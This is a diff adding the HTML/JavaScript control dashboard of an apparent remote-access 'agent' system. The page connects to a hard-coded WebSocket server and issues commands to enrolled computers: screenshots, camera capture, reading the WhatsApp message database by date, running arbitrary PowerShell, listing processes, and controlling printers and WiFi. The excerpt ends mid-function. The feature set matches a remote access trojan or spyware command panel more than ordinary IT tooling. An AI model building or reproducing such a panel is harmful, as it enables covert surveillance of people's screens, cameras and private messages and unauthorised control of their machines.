@@ -1,0 +1,817 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<title>YiDing — Agent Dashboard</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+:root {
+  --bg:   #0d0b1e;
+  --bg2:  rgba(255,255,255,0.04);
+  --bg3:  rgba(255,255,255,0.07);
+  --bdr:  rgba(255,255,255,0.08);
+  --pur:  #7c3aed;
+  --pdim: rgba(124,58,237,0.22);
+  --plt:  #a78bfa;
+  --org:  #f59e0b;
+  --grn:  #10b981;
+  --red:  #ef4444;
+  --txt:  #e2e8f0;
+  --mut:  #64748b;
+  --dim:  #374151;
+}
+body {
+  font-family: 'Segoe UI', sans-serif;
+  background: var(--bg);
+  background-image:
+    radial-gradient(ellipse at 15% 65%, rgba(120,40,210,.18) 0%, transparent 55%),
+    radial-gradient(ellipse at 85% 15%, rgba(80,20,170,.12) 0%, transparent 50%);
+  color: var(--txt); height: 100vh;
+  display: flex; flex-direction: column; overflow: hidden;
+}
+
+/* ── Header ─────────────────────────────────────────────────────────────── */
+header {
+  height: 46px; min-height: 46px;
+  display: flex; align-items: center; gap: 10px; padding: 0 18px;
+  background: rgba(255,255,255,.02); border-bottom: 1px solid var(--bdr); flex-shrink: 0;
+}
+#status-dot { width: 9px; height: 9px; border-radius: 50%; background: var(--red); flex-shrink: 0; transition: .3s; }
+#status-dot.on { background: var(--grn); }
+#status-text { font-size: 12px; color: var(--mut); white-space: nowrap; }
+#app-title {
+  font-size: 15px; font-weight: 600; color: #fff;
+  cursor: pointer; padding: 2px 7px; border-radius: 5px; transition: .15s;
+}
+#app-title:hover { background: var(--bg3); }
+.title-inp {
+  font-size: 15px; font-weight: 600; background: transparent;
+  border: 1px solid var(--pur); border-radius: 5px;
+  color: #fff; padding: 2px 8px; outline: none; min-width: 180px;
+}
+#machine-count { margin-left: auto; font-size: 12px; color: var(--mut); white-space: nowrap; }
+
+main { display: flex; flex: 1; overflow: hidden; }
+
+/* ── Sidebar ─────────────────────────────────────────────────────────────── */
+aside {
+  width: 235px; min-width: 235px;
+  display: flex; flex-direction: column;
+  background: rgba(255,255,255,.015); border-right: 1px solid var(--bdr);
+}
+
+/* Avatar — near edges but not flush, rounded corners */
+.av-section {
+  position: relative;
+  width: calc(100% - 24px);
+  margin: 12px auto 0;
+  aspect-ratio: 1 / 1;
+  border-radius: 12px;
+  cursor: pointer;
+  flex-shrink: 0;
+  overflow: hidden;
+  border: 2px solid var(--pur);
+  box-shadow: 0 4px 24px rgba(124,58,237,.25);
+}
+.av-ph {
+  width: 100%; height: 100%;
+  background: linear-gradient(145deg, var(--pdim), rgba(80,20,170,.28));
+  display: flex; align-items: center; justify-content: center; font-size: 56px;
+}
+#av-img {
+  width: 100%; height: 100%;
+  object-fit: cover; display: none;
+  image-rendering: -webkit-optimize-contrast;
+}
+.av-overlay {
+  position: absolute; inset: 0;
+  background: rgba(0,0,0,.48);
+  display: flex; align-items: center; justify-content: center;
+  font-size: 26px; opacity: 0; transition: .2s;
+  border-radius: 10px;
+}
+.av-section:hover .av-overlay { opacity: 1; }
+
+/* Name section */
+.profile-name {
+  padding: 10px 14px 12px;
+  display: flex; justify-content: center;
+  border-bottom: 1px solid var(--bdr); flex-shrink: 0;
+}
+.name-row {
+  display: flex; align-items: center; gap: 6px; justify-content: center;
+  width: 100%;
+}
+.name-txt {
+  font-size: 16px; font-weight: 700; color: #fff;
+  white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+  max-width: 170px; letter-spacing: .01em;
+}
+.edit-btn {
+  background: none; border: none; cursor: pointer; padding: 3px;
+  color: rgba(255,255,255,.65); opacity: 0; transition: opacity .2s;
+  line-height: 0; flex-shrink: 0;
+}
+.name-row:hover .edit-btn { opacity: 1; }
+.edit-btn:hover { color: var(--plt); }
+.name-edit {
+  display: flex; align-items: center; gap: 6px; width: 100%;
+  background: var(--bg2); border: 1px solid var(--pur);
+  border-radius: 8px; padding: 7px 10px;
+}
+.name-edit-inp {
+  flex: 1; font-size: 15px; font-weight: 700; color: #fff;
+  background: transparent; border: none; outline: none; min-width: 0;
+}
+.save-btn {
+  background: none; border: none; cursor: pointer;
+  font-size: 16px; color: var(--grn); flex-shrink: 0; line-height: 1;
+}
+
+/* Machines */
+.m-scroll { flex: 1; overflow-y: auto; }
+.sec-lbl { padding: 12px 16px 5px; font-size: 10px; letter-spacing: .08em; text-transform: uppercase; color: var(--mut); }
+.m-item {
+  padding: 8px 14px; cursor: pointer;
+  border-left: 3px solid transparent;
+  display: flex; align-items: center; gap: 9px; transition: .15s;
+}
+.m-item:hover { background: var(--bg3); }
+.m-item.active { background: var(--pdim); border-left-color: var(--pur); }
+.m-dot { width: 7px; height: 7px; border-radius: 50%; background: var(--red); flex-shrink: 0; }
+.m-dot.on { background: var(--grn); }
+.m-name { font-size: 13px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+.m-host { font-size: 11px; color: var(--mut); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+
+/* Lang */
+.lang-row {
+  padding: 10px 16px; border-top: 1px solid var(--bdr);
+  display: flex; gap: 5px; justify-content: center; flex-shrink: 0;
+}
+.lang-btn {
+  padding: 4px 11px; border: 1px solid var(--bdr);
+  border-radius: 5px; font-size: 11px; cursor: pointer;
+  background: var(--bg2); color: var(--mut); transition: .15s;
+}
+.lang-btn:hover { background: var(--bg3); }
+.lang-btn.active { background: var(--pur); color: #fff; border-color: var(--pur); }
+
+/* ── Content ─────────────────────────────────────────────────────────────── */
+.content { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
+.toolbar {
+  padding: 10px 14px; background: rgba(255,255,255,.015);
+  border-bottom: 1px solid var(--bdr);
+  display: flex; flex-direction: column; gap: 8px; flex-shrink: 0;
+}
+.tb-row { display: flex; gap: 7px; align-items: center; }
+.btn {
+  padding: 6px 12px; border: none; border-radius: 7px;
+  font-size: 12px; cursor: pointer; font-weight: 500;
+  transition: .15s; white-space: nowrap; flex-shrink: 0;
+}
+.btn:disabled { opacity: .35; cursor: not-allowed; }
+.btn-p { background: var(--pur); color: #fff; }
+.btn-p:hover:not(:disabled) { background: #6d28d9; }
+.btn-g { background: #1a3728; color: #6ee7b7; border: 1px solid #166534; }
+.btn-g:hover:not(:disabled) { background: #166534; color: #fff; }
+.btn-o { background: #3a2608; color: #fbbf24; border: 1px solid #78350f; }
+.btn-o:hover:not(:disabled) { background: #78350f; color: #fff; }
+.btn-s { background: var(--bg2); color: var(--txt); border: 1px solid var(--bdr); }
+.btn-s:hover:not(:disabled) { background: var(--bg3); }
+.tb-in {
+  flex: 1; min-width: 0;
+  background: var(--bg2); border: 1px solid var(--bdr);
+  color: var(--txt); padding: 6px 10px; border-radius: 7px; font-size: 12px; outline: none;
+}
+.tb-in:focus { border-color: var(--pur); }
+.tb-in::placeholder { color: var(--dim); }
+.mono { font-family: 'Consolas', monospace; }
+.vsep { width: 1px; background: var(--bdr); align-self: stretch; flex-shrink: 0; }
+
+/* Printer panel */
+.printer-panel {
+  display: none; padding: 10px 0 4px;
+  border-top: 1px solid var(--bdr); gap: 6px; flex-direction: column;
+}
+.printer-panel.open { display: flex; }
+.printer-row { display: flex; gap: 6px; align-items: center; flex-wrap: wrap; }
+.pt-in {
+  background: var(--bg2); border: 1px solid var(--bdr); color: var(--txt);
+  padding: 5px 9px; border-radius: 7px; font-size: 12px; outline: none; min-width: 0;
+}
+.pt-in:focus { border-color: var(--pur); }
+.pt-in::placeholder { color: var(--dim); }
+
+.output { flex: 1; overflow-y: auto; padding: 14px; display: flex; flex-direction: column; gap: 10px; }
+.empty { flex: 1; display: flex; align-items: center; justify-content: center; color: var(--dim); font-size: 13px; }
+.msg { background: var(--bg2); border: 1px solid var(--bdr); border-radius: 10px; padding: 10px 13px; }
+.msg.err .msg-body { color: #f87171; }
+.msg-hdr { display: flex; align-items: center; gap: 8px; margin-bottom: 7px; overflow: hidden; white-space: nowrap; }
+.msg-act { font-size: 11px; font-weight: 600; color: var(--plt); flex-shrink: 0; }
+.msg-dev { font-size: 11px; color: var(--mut); overflow: hidden; text-overflow: ellipsis; flex: 1; }
+.msg-time { font-size: 11px; color: var(--dim); flex-shrink: 0; }
+.msg-body { font-size: 13px; line-height: 1.5; word-break: break-word; white-space: pre-wrap; }
+.msg-body img { max-width: 100%; border-radius: 6px; margin-top: 6px; cursor: pointer; border: 1px solid var(--bdr); }
+.spinner {
+  display: inline-block; width: 11px; height: 11px;
+  border: 2px solid var(--mut); border-top-color: var(--plt);
+  border-radius: 50%; animation: spin .6s linear infinite;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+::-webkit-scrollbar { width: 4px; }
+::-webkit-scrollbar-track { background: transparent; }
+::-webkit-scrollbar-thumb { background: var(--dim); border-radius: 2px; }
+</style>
+</head>
+<body>
+
+<header>
+  <div id="status-dot"></div>
+  <span id="status-text"></span>
+  <h1 id="app-title" ondblclick="editTitle()" title=""></h1>
+  <span id="machine-count"></span>
+</header>
+
+<main>
+  <aside>
+    <div class="av-section" id="av-wrap" onclick="document.getElementById('av-file').click()" title="">
+      <div class="av-ph" id="av-ph">👤</div>
+      <img id="av-img" alt="">
+      <div class="av-overlay">📷</div>
+    </div>
+    <input type="file" id="av-file" accept="image/*" style="display:none" onchange="onAvatarChange(this)">
+
+    <div class="profile-name">
+      <div id="name-area" style="width:100%">
+        <div class="name-row" id="name-row">
+          <span class="name-txt" id="name-text"></span>
+          <button class="edit-btn" onclick="startEditName()">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M12 20h9"/><path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4 9.5-9.5z"/>
+            </svg>
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <div class="m-scroll">
+      <div class="sec-lbl" id="lbl-machines"></div>
+      <div id="machine-list"></div>
+    </div>
+
+    <div class="lang-row">
+      <button class="lang-btn" id="lang-vi" onclick="setLang('vi')">VI</button>
+      <button class="lang-btn" id="lang-en" onclick="setLang('en')">EN</button>
+      <button class="lang-btn" id="lang-zh" onclick="setLang('zh')">中</button>
+    </div>
+  </aside>
+
+  <div class="content">
+    <div class="toolbar">
+      <div class="tb-row">
+        <button class="btn btn-p" onclick="sendCmd('system_info')"      disabled id="btn-sys"></button>
+        <button class="btn btn-p" onclick="sendCmd('screenshot')"       disabled id="btn-shot"></button>
+        <button class="btn btn-p" onclick="sendCmd('capture_camera')"   disabled id="btn-cam">📸 Camera</button>
+        <button class="btn btn-s" onclick="sendCmd('get_processes')"    disabled id="btn-proc"></button>
+        <button class="btn btn-s" onclick="sendCmd('network_info')"     disabled id="btn-net"></button>
+        <div class="vsep"></div>
+        <button class="btn btn-s" onclick="sendCmdAll('system_info')" id="btn-all"></button>
+      </div>
+      <div class="tb-row">
+        <input class="tb-in" id="notif-msg">
+        <label class="btn btn-o" title="Đính kèm ảnh (hoặc Ctrl+V để dán ảnh)" style="cursor:pointer;font-size:16px" id="btn-img-attach">
+          🖼
+          <input type="file" id="notif-img-input" accept="image/*" style="display:none" onchange="onNotifImgChange(this)">
+        </label>
+        <span id="notif-img-name" style="font-size:11px;color:#a78bfa;max-width:80px;overflow:hidden;white-space:nowrap;"></span>
+        <button class="btn btn-o" onclick="sendNotif()" disabled id="btn-notif"></button>
+        <div class="vsep"></div>
+        <button class="btn btn-o" onclick="sendNotifAll()" id="btn-notif-all"></button>
+      </div>
+      <div class="tb-row">
+        <button class="btn btn-p" onclick="sendCmd('read_whatsapp_db')" disabled id="btn-wa" style="flex:1">💬 WhatsApp</button>
+        <button class="btn btn-s" onclick="sendCmd('read_whatsapp_db',{date_from:promptDateFrom(),date_to:promptDateTo()})" disabled id="btn-wa-date" style="flex:1">📅 WA + ngày</button>
+      </div>
+      <div class="tb-row">
+        <input class="tb-in mono" id="ps-cmd">
+        <button class="btn btn-g" onclick="sendPS()" disabled id="btn-ps"></button>
+        <div class="vsep"></div>
+        <button class="btn btn-s" onclick="togglePrinter()" id="btn-printer">🖨</button>
+      </div>
+
+      <!-- Printer panel (hidden by default) -->
+      <div class="printer-panel" id="printer-panel">
+        <div class="printer-row">
+          <button class="btn btn-s" onclick="sendCmd('list_printers')"    disabled id="btn-list-pt">🖨 List</button>
+          <button class="btn btn-s" onclick="sendCmd('get_print_queue')"  disabled id="btn-queue">📋 Queue</button>
+          <button class="btn btn-s" onclick="clearQueue()"                disabled id="btn-clr-q">🗑 Clear Queue</button>
+        </div>
+        <div class="printer-row">
+          <input class="pt-in" id="pt-ip"   placeholder="Printer IP (e.g. 192.168.1.50)" style="flex:1">
+          <input class="pt-in" id="pt-name" placeholder="Printer name" style="flex:1">
+          <button class="btn btn-s" onclick="installPrinter()" disabled id="btn-install-pt">➕ Install</button>
+        </div>
+        <div class="printer-row">
+          <input class="pt-in mono" id="pt-file"    placeholder="File path to print (C:\file.pdf)" style="flex:1">
+          <input class="pt-in"      id="pt-printer" placeholder="Printer name (blank = default)" style="flex:1 0 140px; max-width:200px">
+          <button class="btn btn-g" onclick="printFile()" disabled id="btn-print-file">🖨 Print</button>
+        </div>
+        <div class="printer-row" style="border-top:1px solid var(--bdr);padding-top:6px;margin-top:2px">
+          <span style="font-size:11px;color:var(--mut);white-space:nowrap">📡 In qua WiFi khác:</span>
+          <input class="pt-in"      id="pt-wifi-target"  placeholder="WiFi máy in (đã lưu)" style="flex:1">
+          <input class="pt-in mono" id="pt-wifi-file"    placeholder="File path (C:\file.pdf)" style="flex:1">
+          <button class="btn btn-s" onclick="sendCmd('wifi_list')" disabled id="btn-wifi-list">📶 WiFi List</button>
+          <button class="btn btn-g" onclick="wifiPrint()"          disabled id="btn-wifi-print">📡🖨 In</button>
+        </div>
+      </div>
+    </div>
+    <div class="output" id="output">
+      <div class="empty" id="empty-msg"></div>
+    </div>
+  </div>
+</main>
+
+<script>
+const VPS = "ws://46.225.160.243:9876/dashboard";
+const EDIT_SVG = `<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 20h9"/><path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4 9.5-9.5z"/></svg>`;
+
+const TR = {
+  vi: {
+    connecting:"Đang kết nối…", connected:"Đã kết nối VPS", disconnected:"Mất kết nối — đang thử lại…",
+    machines:"MÁY TÍNH", sys:"📊 Hệ thống", shot:"📷 Screenshot", proc:"⚙️ Processes", net:"🌐 Mạng",
+    notifPh:"Nội dung thông báo…", sendNotif:"🔔 Gửi", notifAll:"🔔 Tất cả",
+    psPh:"PowerShell command…", runPS:"▶ Chạy PS", allSys:"📊 Tất cả",
+    selectMsg:"← Chọn một máy để bắt đầu", waiting:"Đang chờ…",
+    cnt:(o,t)=>`${o}/${t} máy online`, titleHint:"Nhấp đúp để đổi tiêu đề",
+    avHint:"Click để đổi avatar", editHint:"Đổi tên hiển thị",
+    noSel:"Chọn máy trước.", noMsg:"Nhập nội dung thông báo.", noCmd:"Nhập lệnh PowerShell.",
+    sel:(id,h,on)=>`Đã chọn: <b>${id}</b> (${h}) — ${on?"🟢 Online":"🔴 Offline"}`,
+    bcast:"🔔 Broadcast",
+  },
+  en: {
+    connecting:"Connecting…", connected:"Connected to VPS", disconnected:"Disconnected — retrying…",
+    machines:"MACHINES", sys:"📊 System", shot:"📷 Screenshot", proc:"⚙️ Processes", net:"🌐 Network",
+    notifPh:"Notification message…", sendNotif:"🔔 Send", notifAll:"🔔 All",
+    psPh:"PowerShell command…", runPS:"▶ Run PS", allSys:"📊 All",
+    selectMsg:"← Select a machine to start", waiting:"Waiting…",
+    cnt:(o,t)=>`${o}/${t} online`, titleHint:"Double-click to edit title",
+    avHint:"Click to change avatar", editHint:"Edit display name",
+    noSel:"Select a machine first.", noMsg:"Enter notification message.", noCmd:"Enter PowerShell command.",
+    sel:(id,h,on)=>`Selected: <b>${id}</b> (${h}) — ${on?"🟢 Online":"🔴 Offline"}`,
+    bcast:"🔔 Broadcast",
+  },
+  zh: {
+    connecting:"连接中…", connected:"已连接VPS", disconnected:"连接断开 — 重试中…",
+    machines:"计算机", sys:"📊 系统", shot:"📷 截图", proc:"⚙️ 进程", net:"🌐 网络",
+    notifPh:"通知内容…", sendNotif:"🔔 发送", notifAll:"🔔 全部",
+    psPh:"PowerShell 命令…", runPS:"▶ 运行PS", allSys:"📊 全部",
+    selectMsg:"← 选择一台电脑开始", waiting:"等待中…",
+    cnt:(o,t)=>`${o}/${t} 台在线`, titleHint:"双击编辑标题",
+    avHint:"点击更换头像", editHint:"编辑显示名称",
+    noSel:"请先选择电脑。", noMsg:"请输入通知内容。", noCmd:"请输入PowerShell命令。",
+    sel:(id,h,on)=>`已选择: <b>${id}</b> (${h}) — ${on?"🟢 在线":"🔴 离线"}`,
+    bcast:"🔔 广播",
+  },
+};
+
+let ws, selectedMachine = null, isConnected = false;
+const machines = {};
+let jc = 0, pending = {};
+
+let lang       = localStorage.getItem('dash_lang')  || 'vi';
+let senderName = localStorage.getItem('senderName') || 'Yi Ding IT Agent';
+let appTitle   = localStorage.getItem('appTitle')   || 'YiDing Agent Dashboard';
+
+// ── Avatar storage — full data URL (PNG, lossless) ──────────────────────────
+// Migrate from old avatarB64 (assumed JPEG) if needed
+let avatarDataURL = localStorage.getItem('avatarDataURL') || null;
+if (!avatarDataURL) {
+  const old = localStorage.getItem('avatarB64');
+  if (old) {
+    avatarDataURL = 'data:image/jpeg;base64,' + old;
+    localStorage.setItem('avatarDataURL', avatarDataURL);
+    localStorage.removeItem('avatarB64');
+  }
+}
+
+// boot
+document.getElementById('name-text').textContent = senderName;
+document.getElementById('app-title').textContent = appTitle;
+if (avatarDataURL) setAvUI(avatarDataURL);
+applyLang();
+
+// IME-safe Enter
+document.getElementById('notif-msg').addEventListener('keydown', e => {
+  if (e.isComposing || e.keyCode === 229) return;
+  if (e.key === 'Enter') sendNotif();
+});
+
+// Dán ảnh từ clipboard (Ctrl+V) vào ô thông báo
+document.addEventListener('paste', e => {
+  const active = document.activeElement;
+  const notifInput = document.getElementById('notif-msg');
+  // Chỉ xử lý nếu đang focus vào ô thông báo HOẶC không có ô input nào active
+  const isNotifFocus = (active === notifInput || active === document.body || active === document.documentElement);
+  if (!isNotifFocus) return;
+  const items = e.clipboardData?.items;
+  if (!items) return;
+  for (const item of items) {
+    if (item.type.startsWith('image/')) {
+      e.preventDefault();
+      const file = item.getAsFile();
+      if (!file) return;
+      const reader = new FileReader();
+      reader.onload = ev => {
+        _notifImgB64 = ev.target.result.split(',')[1];
+        document.getElementById('notif-img-name').textContent = '📷 Ảnh đã dán';
+        // Highlight btn để user biết ảnh đã sẵn sàng
+        document.getElementById('btn-img-attach').style.background = '#78350f';
+      };
+      reader.readAsDataURL(file);
+      break;
+    }
+  }
+});
+document.getElementById('ps-cmd').addEventListener('keydown', e => {
+  if (e.isComposing || e.keyCode === 229) return;
+  if (e.key === 'Enter') sendPS();
+});
+
+connect();
+
+// ── Lang ──────────────────────────────────────────────────────────────────
+function t(k) { return TR[lang][k] || TR.vi[k] || k; }
+function setLang(l) { lang = l; localStorage.setItem('dash_lang', l); applyLang(); }
+function applyLang() {
+  const T = TR[lang];
+  document.getElementById('status-text').textContent   = isConnected ? T.connected : T.connecting;
+  document.getElementById('lbl-machines').textContent  = T.machines;
+  document.getElementById('btn-sys').textContent       = T.sys;
+  document.getElementById('btn-shot').textContent      = T.shot;
+  document.getElementById('btn-proc').textContent      = T.proc;
+  document.getElementById('btn-net').textContent       = T.net;
+  document.getElementById('notif-msg').placeholder     = T.notifPh;
+  document.getElementById('btn-notif').textContent     = T.sendNotif;
+  document.getElementById('btn-notif-all').textContent = T.notifAll;
+  document.getElementById('ps-cmd').placeholder        = T.psPh;
+  document.getElementById('btn-ps').textContent        = T.runPS;
+  document.getElementById('btn-all').textContent       = T.allSys;
+  document.getElementById('app-title').title           = T.titleHint;
+  document.getElementById('av-wrap').title             = T.avHint;
+  const eb = document.querySelector('.edit-btn');
+  if (eb) eb.title = T.editHint;
+  const em = document.getElementById('empty-msg');
+  if (em) em.textContent = T.selectMsg;
+  ['vi','en','zh'].forEach(l => document.getElementById('lang-'+l).classList.toggle('active', l===lang));
+  renderCount();
+}
+
+// ── Title edit ─────────────────────────────────────────────────────────────
+function editTitle() {
+  const h1 = document.getElementById('app-title');
+  const inp = document.createElement('input');
+  inp.className = 'title-inp'; inp.value = h1.textContent;
+  h1.replaceWith(inp); inp.focus(); inp.select();
+  function save() {
+    const val = inp.value.trim() || 'YiDing Agent Dashboard';
+    appTitle = val; localStorage.setItem('appTitle', val);
+    const n = document.createElement('h1');
+    n.id = 'app-title'; n.ondblclick = editTitle;
+    n.title = t('titleHint'); n.textContent = val;
+    inp.replaceWith(n);
+  }
+  inp.onblur = save;
+  inp.onkeydown = e => { if (e.key === 'Enter') save(); };
+}
+
+// ── Name edit ──────────────────────────────────────────────────────────────
+function startEditName() {
+  const area = document.getElementById('name-area');
+  area.innerHTML = `<div class="name-edit"><input class="name-edit-inp" id="name-inp" value="${esc(senderName)}" maxlength="40"><button class="save-btn" onclick="saveName()">✓</button></div>`;
+  const inp = document.getElementById('name-inp');
+  inp.focus(); inp.select();
+  inp.onkeydown = e => {
+    if (e.isComposing || e.keyCode === 229) return;
+    if (e.key === 'Enter') saveName();
+    if (e.key === 'Escape') resetName();
+  };
+}
+function saveName() {
+  const v = document.getElementById('name-inp')?.value.trim();
+  if (v) { senderName = v; localStorage.setItem('senderName', v); }
+  resetName();
+}
+function resetName() {
+  document.getElementById('name-area').innerHTML =
+    `<div class="name-row" id="name-row">
+      <span class="name-txt" id="name-text">${esc(senderName)}</span>
+      <button class="edit-btn" onclick="startEditName()" title="${esc(t('editHint'))}">${EDIT_SVG}</button>
+    </div>`;
+}
+function esc(s) { return (s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
+
+// ── Avatar — PNG lossless for sharp quality ────────────────────────────────
+function onAvatarChange(input) {
+  const file = input.files[0]; if (!file) return;
+  const reader = new FileReader();
+  reader.onload = e => {
+    const img = new Image();
+    img.onload = () => {
+      // Crop to square from center, then resize to 600×600 PNG (lossless = no compression artifacts)
+      const sz = Math.min(img.naturalWidth, img.naturalHeight);
+      const sx = (img.naturalWidth  - sz) / 2;
+      const sy = (img.naturalHeight - sz) / 2;
+      const c = document.createElement('canvas');
+      c.width = 600; c.height = 600;
+      const ctx = c.getContext('2d');
+      ctx.imageSmoothingEnabled = true;
+      ctx.imageSmoothingQuality = 'high';
+      ctx.drawImage(img, sx, sy, sz, sz, 0, 0, 600, 600);
+      // PNG = lossless, no JPEG artifacts on sharp details
+      const dataURL = c.toDataURL('image/png');
+      avatarDataURL = dataURL;
+      localStorage.setItem('avatarDataURL', dataURL);
+      setAvUI(dataURL);
+      pushAvAll();
+    };
+    img.src = e.target.result;
+  };
+  reader.readAsDataURL(file);
+}
+function setAvUI(dataURL) {
+  const img = document.getElementById('av-img');
+  const ph  = document.getElementById('av-ph');
+  img.src = dataURL; img.style.display = 'block';
+  if (ph) ph.style.display = 'none';
+}
+// Extract raw base64 from data URL for sending to agent
+function avBase64() {
+  return avatarDataURL ? avatarDataURL.split(',')[1] : null;
+}
+function pushAvAll() {
+  const b64 = avBase64(); if (!b64 || !ws) return;
+  Object.keys(machines).filter(id => machines[id].online).forEach(id =>
+    ws.send(JSON.stringify({type:'cmd',target:id,action:'save_avatar',params:{data:b64},job_id:mkId()}))
+  );
+}
+function pushAvTo(id) {
+  const b64 = avBase64(); if (!b64 || !ws) return;
+  ws.send(JSON.stringify({type:'cmd',target:id,action:'save_avatar',params:{data:b64},job_id:mkId()}));
+}
+
+// ── WebSocket ──────────────────────────────────────────────────────────────
+function connect() {
+  ws = new WebSocket(VPS);
+  ws.onopen = () => {
+    isConnected = true; setStatus(true);
+    ws.send(JSON.stringify({type:'list_agents'}));
+  };
+  ws.onclose = () => { isConnected = false; setStatus(false); setTimeout(connect, 5000); };
+  ws.onmessage = e => {
+    const d = JSON.parse(e.data);
+    if (d.type==='agent_list') {
+      renderList(d.agents);
+      // Push avatar to all agents that are already online when dashboard loads
+      setTimeout(pushAvAll, 500);
+    }
+    else if (d.type==='agent_online')  { machines[d.device_id]={hostname:d.hostname,online:true}; renderList(); pushAvTo(d.device_id); }
+    else if (d.type==='agent_offline') { if(machines[d.device_id]) machines[d.device_id].online=false; renderList(); }
+    else if (d.type==='result')        { showResult(d); }
+  };
+}
+function setStatus(ok) {
+  document.getElementById('status-dot').className = ok ? 'on' : '';
+  document.getElementById('status-text').textContent = ok ? t('connected') : t('disconnected');
+}
+function renderCount() {
+  const ids = Object.keys(machines);
+  document.getElementById('machine-count').textContent = t('cnt')(ids.filter(i=>machines[i].online).length, ids.length);
+}
+function renderList(list) {
+  if (list) list.forEach(a => machines[a.device_id]={hostname:a.hostname,online:a.online});
+  renderCount();
+  document.getElementById('machine-list').innerHTML = Object.keys(machines).map(id => `
+    <div class="m-item ${id===selectedMachine?'active':''}" onclick="selectMachine('${esc(id)}')">
+      <div class="m-dot ${machines[id].online?'on':''}"></div>
+      <div style="overflow:hidden;min-width:0">
+        <div class="m-name">${esc(id)}</div>
+        <div class="m-host">${esc(machines[id].hostname||'')}</div>
+      </div>
+    </div>`).join('');
+}
+function selectMachine(id) {
+  selectedMachine = id; renderList();
+  const on = machines[id]?.online;
+  ['btn-sys','btn-shot','btn-cam','btn-proc','btn-net','btn-notif','btn-ps',
+   'btn-list-pt','btn-queue','btn-clr-q','btn-install-pt','btn-print-file',
+   'btn-wifi-list','btn-wifi-print',
+   'btn-wa','btn-wa-date'].forEach(b => {
+    const el = document.getElementById(b); if (el) el.disabled = !on;
+  });
+  document.getElementById('empty-msg')?.remove();
+  addMsg(TR[lang].sel(id, machines[id]?.hostname||'', on), 'select', '');
+}
+
+// ── Process formatter ──────────────────────────────────────────────────────
+function fmtProcesses(raw) {
+  try {
+    const ps = JSON.parse(raw);
+    if (!Array.isArray(ps)) return raw;
+    const header = `${'Process'.padEnd(24)} ${'PID'.padStart(6)}  ${'CPU%'.padStart(6)}  ${'RAM%'.padStart(6)}`;
+    const sep = '─'.repeat(48);
+    const rows = ps.filter(p=>p.name).slice(0,25).map(p =>
+      `${(p.name||'').slice(0,23).padEnd(24)} ${String(p.pid||'').padStart(6)}  ${(p.cpu_percent||0).toFixed(1).padStart(6)}  ${(p.memory_percent||0).toFixed(2).padStart(6)}`
+    );
+    return [header, sep, ...rows].join('\n');
+  } catch { return raw; }
+}
+
+// ── Messages ───────────────────────────────────────────────────────────────
+function mkId() { return 'j'+Date.now().toString(36); }
+function addMsg(html, action, dev, isErr=false) {
+  const panel = document.getElementById('output');
+  const bid = 'mb-'+(++jc);
+  const div = document.createElement('div');
+  div.className = 'msg'+(isErr?' err':'');
+  div.innerHTML = `<div class="msg-hdr"><span class="msg-act">${action}</span><span class="msg-dev">${dev||selectedMachine||''}</span><span class="msg-time">${new Date().toLocaleTimeString()}</span></div><div class="msg-body" id="${bid}">${html}</div>`;
+  panel.prepend(div);
+  return bid;
+}
+function showResult(d) {
+  if (d.action==='save_avatar') return;
+  const action = d.action||d.job_id||'result', out = d.output||'', isErr = d.status==='error';
+  const bid = pending[d.job_id];
+  if (bid) {
+    delete pending[d.job_id];
+    const el = document.getElementById(bid);
+    if (el) {
+      if (isErr) el.closest('.msg').classList.add('err');
+      if (out.length>200 && /^[A-Za-z0-9+/]+=*$/.test(out.replace(/\s/g,''))) {
+        const mime = action==='capture_camera' ? 'jpeg' : 'png';
+        el.innerHTML = `<img src="data:image/${mime};base64,${out}" onclick="window.open(this.src)">`;
+      }
+      else if (action==='get_processes')  el.textContent = fmtProcesses(out);
+      else if (action==='list_printers')  el.textContent = fmtPrinters(out);
+      else if (action==='get_print_queue') el.textContent = fmtPrintQueue(out);
+      else el.textContent = out||(isErr?'(no output)':'✓ OK');
+      return;
+    }
+  }
+  const isB64 = out.length>200 && /^[A-Za-z0-9+/]+=*$/.test(out.replace(/\s/g,''));
+  if (isB64 && action==='capture_camera')
+    addMsg(`<img src="data:image/jpeg;base64,${out}" onclick="window.open(this.src)">`, '📸 Camera', d.device_id);
+  else if (isB64)
+    addMsg(`<img src="data:image/png;base64,${out}" onclick="window.open(this.src)">`, '📷 Screenshot', d.device_id);
+  else if (action==='get_processes')    addMsg(fmtProcesses(out),   action, d.device_id, isErr);
+  else if (action==='list_printers')    addMsg(fmtPrinters(out),    action, d.device_id, isErr);
+  else if (action==='read_whatsapp_db') addMsg(fmtWhatsApp(out),    '💬 WhatsApp', d.device_id, isErr);
+  else if (action==='get_print_queue') addMsg(fmtPrintQueue(out),  action, d.device_id, isErr);
+  else addMsg(out||(isErr?'(no output)':'✓ OK'), action, d.device_id, isErr);
+}
+
+// ── Commands ───────────────────────────────────────────────────────────────
+function sendCmd(action, params={}, target=null) {
+  const tgt = target||selectedMachine;
+  if (!tgt) return alert(t('noSel'));
+  const job_id = mkId();
+  ws.send(JSON.stringify({type:'cmd',target:tgt,action,params,job_id}));
+  pending[job_id] = addMsg(`<span class="spinner"></span> ${t('waiting')}`, action, tgt);
+}
+let _notifImgB64 = null;
+function onNotifImgChange(input) {
+  const file = input.files[0];
+  if (!file) {
+    _notifImgB64 = null;
+    document.getElementById('notif-img-name').textContent = '';
+    document.getElementById('btn-img-attach').style.background = '';
+    return;
+  }
+  document.getElementById('notif-img-name').textContent = file.name;
+  const reader = new FileReader();
+  reader.onload = e => {
+    _notifImgB64 = e.target.result.split(',')[1];
